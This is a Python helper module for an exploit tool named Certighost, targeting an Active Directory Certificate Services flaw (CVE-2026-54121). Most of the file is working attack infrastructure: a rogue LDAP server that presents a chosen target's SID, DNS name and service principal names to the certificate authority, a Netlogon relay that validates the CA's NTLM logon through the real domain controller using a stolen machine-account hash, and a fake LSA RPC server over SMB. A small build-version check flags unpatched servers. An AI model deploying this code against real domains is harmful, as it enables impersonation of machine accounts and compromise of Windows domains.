"""
Shared helpers for Certighost (CVE-2026-54121).

The protocol implementation is based on the public research by H0j3n and Aniq
Fakhrul. Microsoft fixed the vulnerable AD CS chase path in the July 2026
cumulative updates.
"""

import calendar
import os
import socket
import struct
import threading
import time
from binascii import unhexlify
from typing import Any, Dict, List, Optional, Tuple, Union, cast

from Cryptodome.Cipher import ARC4
from impacket import ntlm, smbserver, uuid
from impacket.dcerpc.v5 import epm, lsad, nrpc, rpcrt, transport
from impacket.dcerpc.v5.dtypes import NULL, RPC_SID
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCServer

EDITF_ENABLECHASECLIENTDC = 0x00100000

CERTIGHOST_FIXED_BUILDS = {
    9200: 26226,  # Windows Server 2012
    9600: 23291,  # Windows Server 2012 R2
    14393: 9339,  # Windows Server 2016
    17763: 9020,  # Windows Server 2019
    20348: 5386,  # Windows Server 2022
    26100: 33158,  # Windows Server 2025
}


def parse_windows_build(build: str) -> Optional[Tuple[int, int]]:
    """Return ``(build, revision)`` from a Windows version string."""
    try:
        parts = [int(part) for part in build.split(".")]
    except (AttributeError, ValueError):
        return None

    if len(parts) == 2:
        return parts[0], parts[1]
    if len(parts) >= 4:
        return parts[-2], parts[-1]
    return None


def is_certighost_build_vulnerable(build: str) -> Optional[bool]:
    """
    Classify a Windows build for CVE-2026-54121.

    ``None`` means the build is unknown or is not one of the affected Windows
    Server release branches.
    """
    parsed = parse_windows_build(build)
    if parsed is None:
        return None

    build_number, revision = parsed
    fixed_revision = CERTIGHOST_FIXED_BUILDS.get(build_number)
    if fixed_revision is None:
        return None

    return revision < fixed_revision


def password_to_nthash(password: str) -> str:
    """Return the NT hash for a machine-account password."""
    from Cryptodome.Hash import MD4

    return MD4.new(password.encode("utf-16-le")).hexdigest()


def detect_listener_ip(remote_ip: str) -> Optional[str]:
    """Find the local source address used to reach the domain controller."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.connect((remote_ip, 445))
        return str(sock.getsockname()[0])
    except OSError:
        return None
    finally:
        sock.close()


def _ber_length(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(encoded)]) + encoded


def _ber_integer(value: int) -> bytes:
    encoded = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
    if encoded[0] & 0x80:
        encoded = b"\x00" + encoded
    return b"\x02" + _ber_length(len(encoded)) + encoded


def _ber_octet(value: Union[str, bytes]) -> bytes:
    encoded = value.encode() if isinstance(value, str) else value
    return b"\x04" + _ber_length(len(encoded)) + encoded


def _ber_sequence(value: bytes) -> bytes:
    return b"\x30" + _ber_length(len(value)) + value


def _ber_set(value: bytes) -> bytes:
    return b"\x31" + _ber_length(len(value)) + value


def _ldap_message(message_id: int, tag: int, payload: bytes) -> bytes:
    return _ber_sequence(
        _ber_integer(message_id) + bytes([tag]) + _ber_length(len(payload)) + payload
    )


def _ldap_bind_response(
    message_id: int, result_code: int = 0, credentials: Optional[bytes] = None
) -> bytes:
    payload = b"\x0a\x01" + bytes([result_code]) + _ber_octet(b"") * 2
    if credentials:
        payload += b"\x87" + _ber_length(len(credentials)) + credentials
    return _ldap_message(message_id, 0x61, payload)


def _ldap_search_entry(
    message_id: int,
    distinguished_name: str,
    attributes: Dict[str, List[Union[str, bytes]]],
) -> bytes:
    encoded_attributes = b""
    for name, values in attributes.items():
        encoded_values = b"".join(_ber_octet(value) for value in values)
        encoded_attributes += _ber_sequence(_ber_octet(name) + _ber_set(encoded_values))
    return _ldap_message(
        message_id,
        0x64,
        _ber_octet(distinguished_name) + _ber_sequence(encoded_attributes),
    )


def _ldap_search_done(message_id: int) -> bytes:
    return _ldap_message(message_id, 0x65, b"\x0a\x01\x00" + _ber_octet(b"") * 2)


def _decode_ber_length(data: bytes, offset: int) -> Tuple[int, int]:
    first = data[offset]
    offset += 1
    if first < 0x80:
        return first, offset
    count = first & 0x7F
    return int.from_bytes(data[offset : offset + count], "big"), offset + count


def _parse_ldap_message(data: bytes) -> Tuple[int, int, bytes]:
    _, offset = _decode_ber_length(data, 1)
    integer_length, offset = _decode_ber_length(data, offset + 1)
    message_id = int.from_bytes(data[offset : offset + integer_length], "big")
    offset += integer_length
    tag = data[offset]
    payload_length, offset = _decode_ber_length(data, offset + 1)
    return message_id, tag, data[offset : offset + payload_length]


def _ntlm_challenge(
    domain_netbios: str,
    domain_dns: str,
    host_netbios: str,
    host_dns: str,
    challenge: bytes,
) -> bytes:
    flags = (
        ntlm.NTLMSSP_NEGOTIATE_UNICODE
        | ntlm.NTLM_NEGOTIATE_OEM
        | ntlm.NTLMSSP_NEGOTIATE_NTLM
        | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
        | ntlm.NTLMSSP_TARGET_TYPE_DOMAIN
        | ntlm.NTLMSSP_NEGOTIATE_VERSION
        | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        | ntlm.NTLMSSP_REQUEST_TARGET
        | ntlm.NTLMSSP_NEGOTIATE_56
        | ntlm.NTLMSSP_NEGOTIATE_128
        | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
    )
    response = ntlm.NTLMAuthChallenge()
    response["flags"] = flags
    response["challenge"] = challenge
    domain_bytes = domain_netbios.encode("utf-16-le")
    response["domain_name"] = domain_bytes
    response["domain_len"] = len(domain_bytes)
    response["domain_max_len"] = len(domain_bytes)
    response["domain_offset"] = 56
    target_info = ntlm.AV_PAIRS()
    target_info[ntlm.NTLMSSP_AV_DOMAINNAME] = domain_netbios.encode("utf-16-le")
    target_info[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domain_dns.encode("utf-16-le")
    target_info[ntlm.NTLMSSP_AV_HOSTNAME] = host_netbios.encode("utf-16-le")
    target_info[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = host_dns.encode("utf-16-le")
    target_info[ntlm.NTLMSSP_AV_TIME] = struct.pack(
        "<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000
    )
    response["TargetInfoFields"] = target_info
    response["TargetInfoFields_len"] = len(target_info)
    response["TargetInfoFields_max_len"] = len(target_info)
    response["TargetInfoFields_offset"] = 56 + len(domain_bytes)
    response["Version"] = b"\x0a\x00\x00\x00\x00\x00\x00\x0f"
    response["VersionLen"] = 8
    return response.getData()


class NetlogonOracle:
    """Validate the CA's NTLM authentication through the real DC."""

    def __init__(
        self, dc_ip: str, computer_name: str, computer_hash: str, domain: str
    ) -> None:
        self.dc_ip = dc_ip
        self.computer_name = computer_name
        self.computer_hash = unhexlify(computer_hash)
        self.domain = domain
        self.server_name = computer_name.rstrip("$")
        self.dce = None
        self.authenticator = None

    def setup(self) -> None:
        binding = epm.hept_map(
            self.dc_ip,
            nrpc.MSRPC_UUID_NRPC,
            dataRepresentation=rpcrt.DCERPC.NDRSyntax,
            protocol="ncacn_ip_tcp",
        )
        rpc_transport = transport.DCERPCTransportFactory(binding)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        syntax = uuid.bin_to_uuidtup(rpcrt.DCERPC.NDRSyntax)
        dce.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=syntax)
        client_challenge = os.urandom(8)
        response = nrpc.hNetrServerReqChallenge(
            dce, "", self.server_name + "\x00", client_challenge
        )
        session_key = nrpc.ComputeSessionKeyStrongKey(
            None,
            client_challenge,
            response["ServerChallenge"],
            self.computer_hash,
        )
        credential = nrpc.ComputeNetlogonCredential(client_challenge, session_key)
        nrpc.hNetrServerAuthenticate3(
            dce,
            "\x00",
            self.computer_name + "\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
            self.server_name + "\x00",
            credential,
            0x600FFFFF,
        )
        dce.set_credentials(self.computer_name, "", self.domain)
        dce.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=syntax)
        authenticator = nrpc.ComputeNetlogonAuthenticator(credential, session_key)
        dce.set_session_key(session_key)
        capabilities = nrpc.hNetrLogonGetCapabilities(
            dce, "", self.server_name, authenticator
        )
        self.authenticator = capabilities["ReturnAuthenticator"]
        self.dce = dce

    def validate(self, blob: bytes, challenge: bytes) -> Tuple[bytes, int, int]:
        if self.dce is None or self.authenticator is None:
            raise RuntimeError("Netlogon oracle is not initialized")
        auth_message = ntlm.NTLMAuthChallengeResponse()
        auth_message.fromString(blob)
        request = nrpc.NetrLogonSamLogonWithFlags()
        request["LogonServer"] = "\x00"
        request["ComputerName"] = self.server_name + "\x00"
        request["ValidationLevel"] = (
            nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        )
        request["LogonLevel"] = (
            nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        )
        request["LogonInformation"]["tag"] = request["LogonLevel"]
        identity = request["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
        identity["LogonDomainName"] = auth_message["domain_name"].decode("utf-16le")
        identity["ParameterControl"] = 2**11
        identity["UserName"] = auth_message["user_name"].decode("utf-16le")
        identity["Workstation"] = ""
        network = request["LogonInformation"]["LogonNetworkTransitive"]
        network["LmChallenge"] = challenge
        network["NtChallengeResponse"] = auth_message["ntlm"]
        network["LmChallengeResponse"] = auth_message["lanman"]
        request["Authenticator"] = self.authenticator
        request["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
        request["ReturnAuthenticator"]["Timestamp"] = 0
        request["ExtraFlags"] = 0
        response = self.dce.request(request)
        session_key = ntlm.generateEncryptedSessionKey(
            response["ValidationInformation"]["ValidationSam4"]["UserSessionKey"],
            auth_message["session_key"],
        )
        return session_key, response["ErrorCode"], auth_message["flags"]


class _LDAPConnectionState:
    def __init__(self) -> None:
        self.flags = 0
        self.client_cipher = None
        self.server_cipher = None
        self.server_signing_key = None
        self.server_sequence = 0
        self.sealed = False
        self.challenge = b""

    def arm(self, session_key: bytes, flags: int) -> None:
        self.flags = flags
        self.server_signing_key = ntlm.SIGNKEY(flags, session_key, "Server")
        self.client_cipher = ARC4.new(ntlm.SEALKEY(flags, session_key, "Client"))
        self.server_cipher = ARC4.new(ntlm.SEALKEY(flags, session_key, "Server"))
        self.sealed = True


class RogueLDAP:
    """Minimal LDAP endpoint that returns the selected target's identity."""

    def __init__(
        self,
        domain: str,
        computer_name: str,
        computer_hash: str,
        dc_ip: str,
        target_sid: bytes,
        target_dns: str,
        target_sam: str,
    ) -> None:
        self.domain = domain.lower()
        self.domain_netbios = domain.split(".")[0].upper()
        self.base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        self.computer_name = computer_name
        self.computer_hash = computer_hash
        self.dc_ip = dc_ip
        self.target_sid = target_sid
        self.target_dns = target_dns
        self.target_sam = target_sam
        self.host_netbios = computer_name.rstrip("$")
        self.host_dns = f"{self.host_netbios}.{self.domain}"

    def _root_dse(self) -> Dict[str, List[Union[str, bytes]]]:
        configuration_dn = f"CN=Configuration,{self.base_dn}"
        return {
            "defaultNamingContext": [self.base_dn],
            "rootDomainNamingContext": [self.base_dn],
            "configurationNamingContext": [configuration_dn],
            "schemaNamingContext": [f"CN=Schema,{configuration_dn}"],
            "namingContexts": [self.base_dn, configuration_dn],
            "dnsHostName": [self.host_dns],
            "ldapServiceName": [
                f"{self.domain}:{self.host_netbios.lower()}$@{self.domain.upper()}"
            ],
            "supportedSASLMechanisms": ["GSSAPI", "GSS-SPNEGO"],
            "supportedLDAPVersion": ["3"],
            "supportedCapabilities": ["1.2.840.113556.1.4.800"],
            "domainFunctionality": ["7"],
            "forestFunctionality": ["7"],
            "domainControllerFunctionality": ["7"],
        }

    def _principal(self) -> Dict[str, List[Union[str, bytes]]]:
        common_name = self.target_sam.rstrip("$")
        return {
            "objectClass": [
                "top",
                "person",
                "organizationalPerson",
                "user",
                "computer",
            ],
            "cn": [common_name],
            "sAMAccountName": [self.target_sam],
            "objectSid": [self.target_sid],
            "objectGUID": [b"\x00" * 16],
            "userAccountControl": ["66048"],
            "objectCategory": [
                f"CN=Computer,CN=Schema,CN=Configuration,{self.base_dn}"
            ],
            "dNSHostName": [self.target_dns],
            "servicePrincipalName": [
                f"HOST/{self.target_dns}",
                f"HOST/{common_name}",
            ],
        }

    def _send(
        self,
        connection: socket.socket,
        state: _LDAPConnectionState,
        payload: bytes,
        sealed: bool,
    ) -> None:
        if not sealed or not state.sealed:
            connection.sendall(payload)
            return
        if state.server_cipher is None:
            raise RuntimeError("LDAP server cipher is not initialized")
        encrypted, signature = ntlm.SEAL(
            state.flags,
            state.server_signing_key,
            b"",
            payload,
            payload,
            state.server_sequence,
            state.server_cipher.encrypt,
        )
        state.server_sequence += 1
        framed = signature.getData() + encrypted
        connection.sendall(struct.pack(">I", len(framed)) + framed)

    def _handle_bind(
        self,
        connection: socket.socket,
        state: _LDAPConnectionState,
        message_id: int,
        payload: bytes,
        sealed: bool,
    ) -> None:
        ntlm_offset = payload.find(b"NTLMSSP\x00")
        if ntlm_offset < 0:
            self._send(connection, state, _ldap_bind_response(message_id), sealed)
            return
        credentials = payload[ntlm_offset:]
        message_type = int.from_bytes(credentials[8:12], "little")
        if message_type == 1:
            state.challenge = os.urandom(8)
            challenge = _ntlm_challenge(
                self.domain_netbios,
                self.domain,
                self.host_netbios,
                self.host_dns,
                state.challenge,
            )
            self._send(
                connection,
                state,
                _ldap_bind_response(message_id, 14, challenge),
                sealed,
            )
            return
        if message_type == 3:
            oracle = NetlogonOracle(
                self.dc_ip,
                self.computer_name,
                self.computer_hash,
                self.domain,
            )
            try:
                oracle.setup()
                session_key, error_code, flags = oracle.validate(
                    credentials, state.challenge
                )
            except Exception:
                self._send(
                    connection, state, _ldap_bind_response(message_id, 49), sealed
                )
                return
            if error_code != 0:
                self._send(
                    connection, state, _ldap_bind_response(message_id, 49), sealed
                )
                return
            state.arm(session_key, flags)
        self._send(connection, state, _ldap_bind_response(message_id), sealed)

    def _handle_search(
        self,
        connection: socket.socket,
        state: _LDAPConnectionState,
        message_id: int,
        payload: bytes,
        sealed: bool,
    ) -> None:
        if not payload or payload[0] != 0x04:
            return
        dn_length, offset = _decode_ber_length(payload, 1)
        base_dn = payload[offset : offset + dn_length].decode("utf-8", errors="replace")
        attributes = self._root_dse() if not base_dn else self._principal()
        self._send(
            connection,
            state,
            _ldap_search_entry(message_id, base_dn, attributes),
            sealed,
        )
        self._send(connection, state, _ldap_search_done(message_id), sealed)

    def _dispatch(
        self,
        connection: socket.socket,
        state: _LDAPConnectionState,
        message: bytes,
        sealed: bool,
    ) -> None:
        message_id, tag, payload = _parse_ldap_message(message)
        if tag == 0x60:
            self._handle_bind(connection, state, message_id, payload, sealed)
        elif tag == 0x63:
            self._handle_search(connection, state, message_id, payload, sealed)

    def _client(self, connection: socket.socket) -> None:
        connection.settimeout(30)
        state = _LDAPConnectionState()
        buffer = b""
        try:
            while True:
                chunk = connection.recv(8192)
                if not chunk:
                    break
                buffer += chunk
                while buffer:
                    if not state.sealed:
                        if len(buffer) < 2 or buffer[0] != 0x30:
                            break
                        length, offset = _decode_ber_length(buffer, 1)
                        total = offset + length
                        if len(buffer) < total:
                            break
                        self._dispatch(connection, state, buffer[:total], False)
                        buffer = buffer[total:]
                    else:
                        if len(buffer) < 4:
                            break
                        length = struct.unpack(">I", buffer[:4])[0]
                        if len(buffer) < 4 + length:
                            break
                        framed = buffer[4 : 4 + length]
                        buffer = buffer[4 + length :]
                        if state.client_cipher is None:
                            raise RuntimeError("LDAP client cipher is not initialized")
                        plain = state.client_cipher.encrypt(framed[16:])
                        position = 0
                        while position < len(plain) and plain[position] == 0x30:
                            length, offset = _decode_ber_length(plain, position + 1)
                            total = offset + length
                            if total > len(plain):
                                break
                            self._dispatch(
                                connection, state, plain[position:total], True
                            )
                            position = total
        except OSError:
            pass
        finally:
            connection.close()

    def serve(self, bind_address: str = "0.0.0.0", port: int = 389) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind_address, port))
        server.listen(8)
        while True:
            connection, _ = server.accept()
            threading.Thread(
                target=self._client, args=(connection,), daemon=True
            ).start()


class RogueLSA(DCERPCServer):
    UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")

    def __init__(
        self,
        domain_netbios: str,
        domain_dns: str,
        domain_guid: bytes,
        domain_sid: str,
    ) -> None:
        super().__init__()
        self.handle = b"\x00" * 4 + b"LSA!" + b"\xde\xad\xbe\xef" * 2
        self.domain_netbios = domain_netbios
        self.domain_dns = domain_dns
        self.domain_guid = domain_guid
        self.domain_sid = domain_sid
        self.addCallbacks(
            self.UUID,
            "\\PIPE\\lsarpc",
            {
                0: self._close,
                6: self._open,
                7: self._query,
                44: self._open2,
                46: self._query2,
            },
        )

    @staticmethod
    def _unicode(value: str) -> Any:
        result = lsad.RPC_UNICODE_STRING()
        result["Data"] = value
        return result

    def _sid(self) -> RPC_SID:
        result = RPC_SID()
        result.fromCanonical(self.domain_sid)
        return result

    def _domain_info(self) -> Any:
        info = lsad.LSAPR_POLICY_DNS_DOMAIN_INFO()
        info["Name"] = self._unicode(self.domain_netbios)
        info["DnsDomainName"] = self._unicode(self.domain_dns)
        info["DnsForestName"] = self._unicode(self.domain_dns)
        info["DomainGuid"] = self.domain_guid
        info["Sid"] = self._sid()
        return info

    def _close(self, _: bytes) -> bytes:
        response = lsad.LsarCloseResponse()
        response["PolicyHandle"] = b"\x00" * 20
        response["ErrorCode"] = 0
        return response.getData()

    def _open(self, _: bytes) -> bytes:
        response = lsad.LsarOpenPolicyResponse()
        response["PolicyHandle"] = self.handle
        response["ErrorCode"] = 0
        return response.getData()

    def _open2(self, _: bytes) -> bytes:
        response = lsad.LsarOpenPolicy2Response()
        response["PolicyHandle"] = self.handle
        response["ErrorCode"] = 0
        return response.getData()

    def _query_common(self, data: bytes, response_type: Any) -> bytes:
        try:
            level = int(lsad.LsarQueryInformationPolicy(data)["InformationClass"])
        except Exception:
            level = 12
        response = response_type()
        information = lsad.LSAPR_POLICY_INFORMATION()
        if level in (12, 13):
            information["tag"] = level
            information[
                "PolicyDnsDomainInfo" if level == 12 else "PolicyDnsDomainInfoInt"
            ] = self._domain_info()
        elif level in (5, 14):
            information["tag"] = level
            account = lsad.LSAPR_POLICY_ACCOUNT_DOM_INFO()
            account["DomainName"] = self._unicode(self.domain_netbios)
            account["DomainSid"] = self._sid()
            information[
                (
                    "PolicyAccountDomainInfo"
                    if level == 5
                    else "PolicyLocalAccountDomainInfo"
                )
            ] = account
        elif level == 3:
            information["tag"] = 3
            primary = lsad.LSAPR_POLICY_PRIMARY_DOM_INFO()
            primary["Name"] = self._unicode(self.domain_netbios)
            primary["Sid"] = self._sid()
            information["PolicyPrimaryDomainInfo"] = primary
        elif level == 6:
            information["tag"] = 6
            role = lsad.POLICY_LSA_SERVER_ROLE_INFO()
            role["LsaServerRole"] = 3
            information["PolicyServerRoleInfo"] = role
        else:
            response["PolicyInformation"] = NULL
            response["ErrorCode"] = 0xC0000022
            return response.getData()
        response["PolicyInformation"] = information
        response["ErrorCode"] = 0
        return response.getData()

    def _query(self, data: bytes) -> bytes:
        return self._query_common(data, lsad.LsarQueryInformationPolicyResponse)

    def _query2(self, data: bytes) -> bytes:
        return self._query_common(data, lsad.LsarQueryInformationPolicy2Response)


def _patch_simple_smb_server() -> None:
    server_type = smbserver.SimpleSMBServer
    untyped_server_type = cast(Any, server_type)
    if not hasattr(server_type, "setComputerAccount"):

        def set_computer_account(server: Any, **kwargs: str) -> None:
            config = server._SimpleSMBServer__smbConfig
            config.set("global", "server_name", kwargs["computer_account_name"][:-1])
            config.set("global", "server_domain", kwargs["computer_account_domain"])
            for key in (
                "computer_account_name",
                "computer_account_hash",
                "computer_account_aes",
                "computer_account_password",
                "computer_account_domain",
            ):
                config.set("global", key, kwargs.get(key, "") or "")
            config.set("global", "dcip", kwargs["dcip"])
            server._SimpleSMBServer__server.setServerConfig(config)
            server._SimpleSMBServer__server.processConfigFile()

        untyped_server_type.setComputerAccount = set_computer_account
    if not hasattr(server_type, "getServer"):
        untyped_server_type.getServer = lambda server: server._SimpleSMBServer__server


def serve_lsa_over_smb(
    bind_address: str,
    domain: str,
    domain_guid: bytes,
    domain_sid: str,
    computer_name: str,
    computer_hash: str,
    computer_password: str,
    dc_ip: str,
    port: int = 445,
) -> None:
    """Serve the LSA named pipe required by the CA chase."""
    _patch_simple_smb_server()
    server = smbserver.SimpleSMBServer(listenAddress=bind_address, listenPort=port)
    server.setSMB2Support(True)
    server.setLogFile("")
    server.setComputerAccount(
        computer_account_name=computer_name,
        computer_account_hash=computer_hash,
        computer_account_aes="",
        computer_account_password=computer_password,
        computer_account_domain=domain,
        dcip=dc_ip,
    )
    untyped_server = cast(Any, server)
    config = untyped_server._SimpleSMBServer__smbConfig
    config.set("global", "server_os", "Windows Server 2022 Standard")
    server.getServer().setServerConfig(config)
    server.getServer().processConfigFile()
    lsa = RogueLSA(domain.split(".")[0].upper(), domain, domain_guid, domain_sid)
    lsa.daemon = True
    lsa.start()
    server.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
    server.start()


def wait_for_listeners(timeout: int = 15) -> bool:
    """Wait until the local LDAP and SMB listeners are accepting connections."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        ready = True
        for port in (389, 445):
            try:
                connection = socket.create_connection(("127.0.0.1", port), 1)
                connection.close()
            except OSError:
                ready = False
                break
        if ready:
            return True
        time.sleep(0.25)
    return False
